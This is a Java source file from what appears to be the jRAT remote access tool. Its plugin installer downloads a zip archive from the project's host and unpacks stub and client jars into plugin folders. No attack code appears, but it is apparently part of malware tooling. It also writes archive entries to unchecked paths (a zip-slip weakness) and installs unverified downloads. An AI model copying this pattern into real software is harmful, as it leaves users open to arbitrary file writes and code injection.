package pro.jrat.extensions;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import pro.jrat.Constants;
import pro.jrat.ErrorDialog;
import pro.jrat.common.utils.IOUtils;
import pro.jrat.net.WebRequest;


public class ExtensionInstaller {

	private OnlinePlugin plugin;

	public ExtensionInstaller(OnlinePlugin plugin) {
		this.plugin = plugin;
	}

	public void toggle() {
		try {
			if (plugin.isInstalled()) {
				uninstall();
			} else {
				install();
			}
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

	public void uninstall() throws Exception  {
		// TODO UNINSTALL
	}

	public void install() throws Exception {
		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");
		
		InputStream archive = WebRequest.getInputStream(Constants.HOST + "/plugins/" + plugin.getName() + "/archive.zip");
		FileOutputStream out = new FileOutputStream(temp);
		
		IOUtils.copy(archive, out);
		
		archive.close();
		out.close();
		
		
		ZipFile zip = new ZipFile(temp);
		Enumeration<? extends ZipEntry> entries = zip.entries();
		
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			
			File output;

			if (entry.getName().equals("Stub.jar")) {
				output = new File("plugins/stubs/" + plugin.getName() + ".jar");
			} else if (entry.getName().equals("Client.jar")) {
				output = new File("plugins/" + plugin.getName() + ".jar");
			} else {
				output = new File("plugins/" + plugin.getName() + "/" + entry.getName());
			}
			
			if (!output.getParentFile().exists()) {
				output.getParentFile().mkdirs();
			}
						
			output.createNewFile();
			
			InputStream entryIs = zip.getInputStream(entry);	
			FileOutputStream entryOut = new FileOutputStream(output);
			
			IOUtils.copy(entryIs, entryOut);
			
			entryIs.close();
			entryOut.close();
		}
		
		zip.close();
		
		temp.delete();
	}

}
